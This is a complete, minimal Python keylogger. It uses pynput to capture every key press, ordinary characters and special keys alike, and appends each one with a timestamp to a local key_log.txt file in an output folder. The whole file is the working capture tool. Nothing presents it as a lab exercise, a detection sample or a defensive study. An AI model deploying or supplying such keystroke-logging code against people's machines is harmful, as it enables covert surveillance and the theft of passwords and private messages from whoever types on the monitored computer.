from pynput import keyboard
import os
from datetime import datetime

# Create output directory if it doesn't exist
output_dir = os.path.join(os.path.dirname(__file__), '..', 'output')
os.makedirs(output_dir, exist_ok=True)

# Set log file path
log_file = os.path.join(output_dir, 'key_log.txt')

def write_to_file(key):
    with open(log_file, 'a') as f:
        f.write(f'{datetime.now()} - {key}\n')

def on_press(key):
    try:
        write_to_file(key.char)
    except AttributeError:
        write_to_file(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
